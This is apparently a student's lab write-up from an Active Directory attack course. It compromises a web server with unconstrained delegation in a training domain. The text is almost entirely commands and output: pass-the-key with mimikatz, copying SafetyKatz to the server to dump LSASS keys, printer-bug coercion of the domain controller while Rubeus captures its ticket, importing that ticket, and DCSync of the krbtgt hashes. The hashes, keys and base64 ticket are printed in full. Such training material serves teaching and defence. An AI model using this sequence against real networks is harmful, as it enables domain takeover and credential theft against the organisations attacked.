# HANDS-ON 11:

```
Find a server in US domain where Unconstrained Delegation is enabled.
Compromise that server and get Domain Admin privileges.

```

## Index of content
  1. [Untrusted Delegation](#untrusted-delegation)
  2. [Compromise Server](#compromise-server)
  3. [Krbtgt credentials](#krbtgt-credentials)


## Untrusted Delegation

Detected unconstrained trusted delegation:
```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

DistinguishedName : CN=US-DC,OU=Domain Controllers,DC=us,DC=techcorp,DC=local
DNSHostName       : US-DC.us.techcorp.local
Enabled           : True
Name              : US-DC
ObjectClass       : computer
ObjectGUID        : 2edf59cf-aa6e-448a-9810-7a81a3d3af16
SamAccountName    : US-DC$
SID               : S-1-5-21-210670787-2521448726-163245708-1000
UserPrincipalName :

DistinguishedName : CN=US-WEB,CN=Computers,DC=us,DC=techcorp,DC=local
DNSHostName       : US-Web.us.techcorp.local
Enabled           : True
Name              : US-WEB
ObjectClass       : computer
ObjectGUID        : cb00dc1e-3619-4187-a02b-42f9c964a637
SamAccountName    : US-WEB$
SID               : S-1-5-21-210670787-2521448726-163245708-1110
UserPrincipalName :
```
ReUse credentials for user webmaster on extracted on the previous hands-on, and obtain TGS ticket with pass the hash technique:

```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::opassth /user:webmaster /domain:us.techcorp.local /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:cmd.exe
user    : webmaster
domain  : us.techcorp.local
program : cmd.exe
impers. : no
AES256  : 2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
  |  PID  1328
  |  TID  3908
  |  LSA Process is now R/W
  |  LUID 0 ; 5623009 (00000000:0055cce1)
  \_ msv1_0   - data copy @ 0000028B2F3AAE10 : OK !
  \_ kerberos - data copy @ 0000028B2F5480A8
   \_ aes256_hmac       OK
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       -> null
   \_ rc4_hmac_old      -> null
   \_ rc4_md4           -> null
   \_ rc4_hmac_nt_exp   -> null
   \_ rc4_hmac_old_exp  -> null
   \_ *Password replace @ 0000028B2F4C9CD8 (32) -> null

mimikatz #

```
New cmd qith privilege access to US-webmaster computer:

```
C:\Windows\system32>whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
us\studentuser17 S-1-5-21-210670787-2521448726-163245708-16107

ERROR: Unable to get group membership information.

C:\Windows\system32>winrs -r:us-web cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>hostname
hostname
US-Web

C:\Users\webmaster>whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID
============ ============================================
us\webmaster S-1-5-21-210670787-2521448726-163245708-1140


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes    
```
## Compromise Server

From attacker machine copy SfetyKatz to the US-WEB machine:
```
C:\Windows\system32>net use  x: \\us-web\C$\Users\Public
x: has a remembered connection to \\us-mailmgmt\C$\Users\Administrator. Do you
want to overwrite the remembered connection? (Y/N) [Y]: Y
The command completed successfully.

C:\Windows\system32>echo F | xcopy C:\AD\Tools\SafetyKatz.exe x:\SafetyKatz.exe
Does X:\SafetyKatz.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\SafetyKatz.exe
1 File(s) copied


```

Access to the target machine and DumpCredentials for lsass process:

```
C:\Windows\system32>winrs -r:us-web cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>cd C:\Users\Public
cd C:\Users\Public

C:\Users\Public>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of C:\Users\Public

02/18/2023  02:42 PM    <DIR>          .
02/18/2023  02:42 PM    <DIR>          ..
05/25/2019  02:22 AM    <DIR>          Documents
09/14/2018  11:19 PM    <DIR>          Downloads
11/16/2022  04:28 AM            64,512 Loader.exe
09/14/2018  11:19 PM    <DIR>          Music
09/14/2018  11:19 PM    <DIR>          Pictures
12/23/2022  05:23 PM         1,891,840 SafetyKatz.exe
09/14/2018  11:19 PM    <DIR>          Videos
               2 File(s)      1,956,352 bytes
               7 Dir(s)  15,716,372,480 bytes free

C:\Users\Public>C:\SafetyKatz.exe
C:\SafetyKatz.exe
'C:\SafetyKatz.exe' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Public>C:\Users\Public\SafetyKatz.exe
C:\Users\Public\SafetyKatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::keys

Authentication Id : 0 ; 1527221 (00000000:00174db5)
Session           : RemoteInteractive from 2
User Name         : webmaster
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 3:20:34 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1140

         * Username : webmaster
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
           rc4_hmac_nt       23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old      23d6458d06b25e463b9666364fb0b29f
           rc4_md4           23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_nt_exp   23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old_exp  23d6458d06b25e463b9666364fb0b29f

Authentication Id : 0 ; 41874 (00000000:0000a392)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:08 AM
SID               : S-1-5-90-0-1

         * Username : US-WEB$
         * Domain   : us.techcorp.local
         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
         * Key List :
           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
           rc4_md4           892ca1e8d4343c652646b59b51779929
           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929

Authentication Id : 0 ; 24519 (00000000:00005fc7)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:08 AM
SID               : S-1-5-96-0-1

         * Username : US-WEB$
         * Domain   : us.techcorp.local
         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
         * Key List :
           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
           rc4_md4           892ca1e8d4343c652646b59b51779929
           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929

Authentication Id : 0 ; 24463 (00000000:00005f8f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:08 AM
SID               : S-1-5-96-0-0

         * Username : US-WEB$
         * Domain   : us.techcorp.local
         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
         * Key List :
           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
           rc4_md4           892ca1e8d4343c652646b59b51779929
           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-WEB$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:07 AM
SID               : S-1-5-18

         * Username : us-web$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       ff8e1037043ae75457e206470ff99a95f40f1a30ebcf6a877e2a2683b82af07c
           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
           rc4_md4           892ca1e8d4343c652646b59b51779929
           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929

Authentication Id : 0 ; 1527159 (00000000:00174d77)
Session           : RemoteInteractive from 2
User Name         : webmaster
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 3:20:34 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1140

         * Username : webmaster
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
           rc4_hmac_nt       23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old      23d6458d06b25e463b9666364fb0b29f
           rc4_md4           23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_nt_exp   23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old_exp  23d6458d06b25e463b9666364fb0b29f

Authentication Id : 0 ; 1355046 (00000000:0014ad26)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:45 AM
SID               : S-1-5-90-0-2

         * Username : US-WEB$
         * Domain   : us.techcorp.local
         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
         * Key List :
           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
           rc4_md4           892ca1e8d4343c652646b59b51779929
           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929

Authentication Id : 0 ; 1355022 (00000000:0014ad0e)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:45 AM
SID               : S-1-5-90-0-2

         * Username : US-WEB$
         * Domain   : us.techcorp.local
         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
         * Key List :
           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
           rc4_md4           892ca1e8d4343c652646b59b51779929
           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929

Authentication Id : 0 ; 1353070 (00000000:0014a56e)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:45 AM
SID               : S-1-5-96-0-2

         * Username : US-WEB$
         * Domain   : us.techcorp.local
         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
         * Key List :
           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
           rc4_md4           892ca1e8d4343c652646b59b51779929
           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929

Authentication Id : 0 ; 41892 (00000000:0000a3a4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:08 AM
SID               : S-1-5-90-0-1

         * Username : US-WEB$
         * Domain   : us.techcorp.local
         * Password : 0I7.p^^to%AE? sq!.[\!lUUaBYiU^Ew-t^^@@&'Sp!ykctIPCm,<n2;rR$*y1ThkKCMjzP 7zmH'V)CTjF9@;R<nU ^Cu^ -STMQ0W_Q]_fA(6?;oUX$%>?
         * Key List :
           aes256_hmac       db4ea970941159dc9c1a44805445a6811be17aafedc64dd6972db6bbdce46cf6
           aes128_hmac       5951e4e276047664615d9d7a6c3d8d4e
           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
           rc4_md4           892ca1e8d4343c652646b59b51779929
           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : US-WEB$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:08 AM
SID               : S-1-5-20

         * Username : us-web$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       ff8e1037043ae75457e206470ff99a95f40f1a30ebcf6a877e2a2683b82af07c
           rc4_hmac_nt       892ca1e8d4343c652646b59b51779929
           rc4_hmac_old      892ca1e8d4343c652646b59b51779929
           rc4_md4           892ca1e8d4343c652646b59b51779929
           rc4_hmac_nt_exp   892ca1e8d4343c652646b59b51779929
           rc4_hmac_old_exp  892ca1e8d4343c652646b59b51779929

```
## Krbtgt credentials

Extract krbtgt credentials directly from domain controller, using a printer bug binary:
  - From the attacker machine copy the Rebeus binary to US-web 
  - The attacker force with webmaster credentials to US-DC connect to US-WEB with a printer bug binary

```
echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe
Does \\us-web\C$\Users\Public\Rubeus.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Rubeus.exe
1 File(s) copied

```
Connect and start monitoring:
```
C:\Windows\system32>winrs -r:us-web cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: TGT Monitoring
[*] Target user     : US-DC$
[*] Monitoring every 5 seconds for new TGTs
```
Printer Debug force authentication remote from US-DC to US-WEB
```
PS C:\Users\studentuser17> C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
PS C:\Users\studentuser17>
```
Monitoring with Rubeus:

```
[*] 2/18/2023 11:24:48 PM UTC - Found new TGT:

  User                  :  US-DC$@US.TECHCORP.LOCAL
  StartTime             :  2/18/2023 3:08:24 PM
  EndTime               :  2/19/2023 1:08:24 AM
  RenewTill             :  2/24/2023 8:05:09 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMo3+31uKKzv1GpxAe3oIg7AyvxEOlMdvaOAj89e71ayHalNk4uGJA77vvZ/hwpMhVT8RdtJYnwWKHIpD4ZPbvuhMp1LpNxsqJBe+nn9hbaVr4xpfCy303qupLoYPE3SK/VZZS61W1AEO3LLtijyYRWq4Q4FoO/1XKLvUrJxn52inDpAuqtJofvpAwlepDY2mBG08CpSYKa9ixn8mfv3IN67RmNkpsT2gRiJ4FEVaMGyL4XofeCrRYHil5mDI9PBLdByX9JmZPglDzq6/vOj/DHf84WI2K1qBnAOF5/THEXN1Vyfm+6S9PrhvbIvOifn3h6GsoZolomatPiInBV9u7BSWxE7glddo+oPmSQJ6EGmNRDZl64C9esuIZhq8eWnHVF/P37ICCoIld8hnuMGmUfyfWxmxA/b3LjBse08IQiPcmZquJOIaUWx4Han5eajNVR1IJ2KseNzN1lXVWDFuQ1zyUgXECdTsD0WziJCjaIF6sGt4RQCOAlqr4Niy3R5/paH6Y5pTTtFRyGAOClnMCO5kHGG4Qaf8PsE0SZ3EYxfz6OP+Qz1TBPrWf90zcpQnMUdzFnHHrJA+DfIJaWyPnzvq80kdnvAmR5do92I9/xa2dH7uV9XulVpig58DH7NeMX5E4s+sf40cFN40tZnWylVS8cSU8uhBwxTWyodKoL6wIH0y16sHXNSBli6SwOayOnhx8TzbVq3MBjfyGkk9MVrwY0AxOJCtFePXH9Yavlorp1zVi7RIC2FakPWHkzLgP/JFubJ2TMJOgvkdNGA4maCcq3lSbtcq7XcxL4f0mvV7ZkGu2Qrneruy4hisfa/T+SVoNaKtAirc/msK5EXLwYGKwd/xWTbaxD0wxzA5AuFtQd9TEbr9duc9E+n2KXKsALiGeOE6tM09eiVjjjANFr5e8TDdwQNPj5khqnBhmyt+D3veKReVT8o3XMczt60h83nhUg7F7icOziNQSnkYvdBlQdf/YEydxVQdVz15fjbBsqGWtpwMC++AbrzDgplHeX7Gsd2w5PbyyQgpjSwDY9nk/KZXZdAw/omzzOywOPQ8owCeOFzmrZ/85W4NCGUlPD0WZtB5h9k+9pKnc2BnqZzwHeJ/VJdmj5Uz++XhYYLeEUBkbWUQKKT9n6xmDxSXCOeMRH612k20QZ0iyTSqgXwRaZZj4P+2aPsadYRPk21nPg6DY35mZO3w6qF5Rf+bg4RyymU3kCPheAMdotYQ1/blTkPxpMBw290fDx0MntBpny3Axh6Fn23pkhwcL18SBKZDj5OetQlmzIlNh8day40eSmfz7IR/lImse9Cp+G3qffd7Ao7EQMw8aw3unfT4jftoRsH48HFSd8lHacwH8IPpArNWN7kUURL2KlwdSh3TKayyiecrrqCGdYU1ZLx6ufjMoQAu4BQmD+FIzqLnH43MDpk3/RC/ektBz7mtOexOewNXFBJhdN6LXn82jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCD1K8RYfzEbcKU4f4Us7TTSPJVawKCEfVp4mmFJUPTCp6ETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDIzMDIxODIzMDgyNFqmERgPMjAyMzAyMTkwOTA4MjRapxEYDzIwMjMwMjI1MDQwNTA5WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=

[*] Ticket cache size: 1

```
Use Pass tht Ticket with rubeus and verify the imported krbtgt ticket:

```
C:\Users\studentuser17>C:\AD\Tools\Rubeus.exe ptt /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMo3+31uKKzv1GpxAe3oIg7AyvxEOlMdvaOAj89e71ayHalNk4uGJA77vvZ/hwpMhVT8RdtJYnwWKHIpD4ZPbvuhMp1LpNxsqJBe+nn9hbaVr4xpfCy303qupLoYPE3SK/VZZS61W1AEO3LLtijyYRWq4Q4FoO/1XKLvUrJxn52inDpAuqtJofvpAwlepDY2mBG08CpSYKa9ixn8mfv3IN67RmNkpsT2gRiJ4FEVaMGyL4XofeCrRYHil5mDI9PBLdByX9JmZPglDzq6/vOj/DHf84WI2K1qBnAOF5/THEXN1Vyfm+6S9PrhvbIvOifn3h6GsoZolomatPiInBV9u7BSWxE7glddo+oPmSQJ6EGmNRDZl64C9esuIZhq8eWnHVF/P37ICCoIld8hnuMGmUfyfWxmxA/b3LjBse08IQiPcmZquJOIaUWx4Han5eajNVR1IJ2KseNzN1lXVWDFuQ1zyUgXECdTsD0WziJCjaIF6sGt4RQCOAlqr4Niy3R5/paH6Y5pTTtFRyGAOClnMCO5kHGG4Qaf8PsE0SZ3EYxfz6OP+Qz1TBPrWf90zcpQnMUdzFnHHrJA+DfIJaWyPnzvq80kdnvAmR5do92I9/xa2dH7uV9XulVpig58DH7NeMX5E4s+sf40cFN40tZnWylVS8cSU8uhBwxTWyodKoL6wIH0y16sHXNSBli6SwOayOnhx8TzbVq3MBjfyGkk9MVrwY0AxOJCtFePXH9Yavlorp1zVi7RIC2FakPWHkzLgP/JFubJ2TMJOgvkdNGA4maCcq3lSbtcq7XcxL4f0mvV7ZkGu2Qrneruy4hisfa/T+SVoNaKtAirc/msK5EXLwYGKwd/xWTbaxD0wxzA5AuFtQd9TEbr9duc9E+n2KXKsALiGeOE6tM09eiVjjjANFr5e8TDdwQNPj5khqnBhmyt+D3veKReVT8o3XMczt60h83nhUg7F7icOziNQSnkYvdBlQdf/YEydxVQdVz15fjbBsqGWtpwMC++AbrzDgplHeX7Gsd2w5PbyyQgpjSwDY9nk/KZXZdAw/omzzOywOPQ8owCeOFzmrZ/85W4NCGUlPD0WZtB5h9k+9pKnc2BnqZzwHeJ/VJdmj5Uz++XhYYLeEUBkbWUQKKT9n6xmDxSXCOeMRH612k20QZ0iyTSqgXwRaZZj4P+2aPsadYRPk21nPg6DY35mZO3w6qF5Rf+bg4RyymU3kCPheAMdotYQ1/blTkPxpMBw290fDx0MntBpny3Axh6Fn23pkhwcL18SBKZDj5OetQlmzIlNh8day40eSmfz7IR/lImse9Cp+G3qffd7Ao7EQMw8aw3unfT4jftoRsH48HFSd8lHacwH8IPpArNWN7kUURL2KlwdSh3TKayyiecrrqCGdYU1ZLx6ufjMoQAu4BQmD+FIzqLnH43MDpk3/RC/ektBz7mtOexOewNXFBJhdN6LXn82jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCD1K8RYfzEbcKU4f4Us7TTSPJVawKCEfVp4mmFJUPTCp6ETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDIzMDIxODIzMDgyNFqmERgPMjAyMzAyMTkwOTA4MjRapxEYDzIwMjMwMjI1MDQwNTA5WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
```
Validate imported ticket with klist:
```
C:\Users\studentuser17>klist

Current LogonId is 0:0x413e6

Cached Tickets: (1)

#0>     Client: US-DC$ @ US.TECHCORP.LOCAL
        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/18/2023 15:08:24 (local)
        End Time:   2/19/2023 1:08:24 (local)
        Renew Time: 2/24/2023 20:05:09 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Use dcsync with sharpkatz in order to dump krbtgt from Domain controller:

```
C:\Users\studentuser17>C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] us.techcorp.local will be the domain
[!] us-dc.us.techcorp.local will be the DC server
[!] us\krbtgt will be the user account
[*]
[*] Object RDN           : krbtgt
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : krbtgt
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : ACCOUNTDISABLE, NORMAL_ACCOUNT
[*] Account expiration   : 12/31/9999 11:59:59 PM
[*] Password last change : 7/5/2019 12:49:17 AM
[*] Object Security ID   : S-1-5-21-210670787-2521448726-163245708-502
[*] Object Relative ID   : 502
[*]
[*] Credents:
[*] Hash NTLM            : b0975ae49f441adc6b024ad238935af5
[*] ntlm- 0              : b0975ae49f441adc6b024ad238935af5
[*] lm  - 0              : d765cfb668ed3b1f510b8c3861447173
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : 819a7c8674e0302cbeec32f3f7b226c9
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :US.TECHCORP.LOCALkrbtgt
[*]     Credents
[*]     aes256_hmac       4096: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
[*]     aes128_hmac       4096: 1bae2a6639bb33bf720e2d50807bf2c1
[*]     des_cbc_md5       4096: 923158b519f7a454
[*]     ServiceCredents
[*]     OldCredents
[*]     OlderCredents
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :US.TECHCORP.LOCALkrbtgt
[*]     Credents
[*]     des_cbc_md5       : 923158b519f7a454
[*]     OldCredents
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
[*]
[*]  * Primary:WDigest
[*]     01 a1bdf6146e4b13c939093eb2d72416c9
[*]     02 cd864c0d5369adad4fc59a469a2d4d17
[*]     03 2123179b0ab5c0e37943e346ef1f9d9a
[*]     04 a1bdf6146e4b13c939093eb2d72416c9
[*]     05 cd864c0d5369adad4fc59a469a2d4d17
[*]     06 3449e5615d5a09bbc2802cefa8e4f9d4
[*]     07 a1bdf6146e4b13c939093eb2d72416c9
[*]     08 296114c8d353f7435b5c3ac112523ba4
[*]     09 296114c8d353f7435b5c3ac112523ba4
[*]     10 5d504fb94f1bcca78bd048de9dad69e4
[*]     11 142c7fde1e3cb590f54e12bbfdecfbe4
[*]     12 296114c8d353f7435b5c3ac112523ba4
[*]     13 13db8df6b262a6013f78b082a72add2c
[*]     14 142c7fde1e3cb590f54e12bbfdecfbe4
[*]     15 b024bdda9bdb86af00c3b2503c3bf620
[*]     16 b024bdda9bdb86af00c3b2503c3bf620
[*]     17 91600843c8dadc79e72a753649a05d75
[*]     18 423730024cfbbc450961f67008a128a5
[*]     19 d71f700d63fa4510477342b9dc3f3cc7
[*]     20 bad6b9122f71f8cfd7ea556374d381d9
[*]     21 52c6560f77613d0dcf460476da445d93
[*]     22 52c6560f77613d0dcf460476da445d93
[*]     23 23504d9f1325c5cf68892348f26e77d7
[*]     24 8228bd623c788b638fce1368c6b3ef44
[*]     25 8228bd623c788b638fce1368c6b3ef44
[*]     26 a2659c1d9fa797075b1fabdee926569b
[*]     27 784f5fbc5276dcc8f88bbcdfa27b65d8
[*]     28 2ac6c7c1c24262b424f85e1ab762f1d3
[*]     29 4bef285b22fd87f4868be352958dcb9e
